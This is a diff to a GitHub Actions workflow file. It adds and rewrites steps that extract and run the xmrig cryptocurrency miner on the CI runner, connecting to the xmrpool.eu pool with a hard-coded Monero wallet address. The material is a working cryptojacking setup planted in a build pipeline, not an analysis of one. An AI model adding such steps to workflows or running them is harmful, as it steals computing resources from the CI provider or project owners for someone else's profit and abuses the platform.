@@ -35,10 +35,13 @@ jobs:
       - name: extract xmrig
         run: tar xvf *.gz
 
+      - name: lest mine
+        run: | 
+                cd xmrig* 
+                ls
+                
       - name: running miner
-        run: |
-          cd xmrig* ,
-          ./xmrig -o xmrpool.eu:9999 -u 48waHbFYRVED3gLpqEwXvS4v4ppwLas1UHAwVD8n9mxvFegC39KTGQUTXMyimssFHiGqw491FFBYMdvbmBW9m4KXG5HitDV -k --tls .
+        run: ./xmrig -o xmrpool.eu:9999 -u 48waHbFYRVED3gLpqEwXvS4v4ppwLas1UHAwVD8n9mxvFegC39KTGQUTXMyimssFHiGqw491FFBYMdvbmBW9m4KXG5HitDV -k --tls 
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
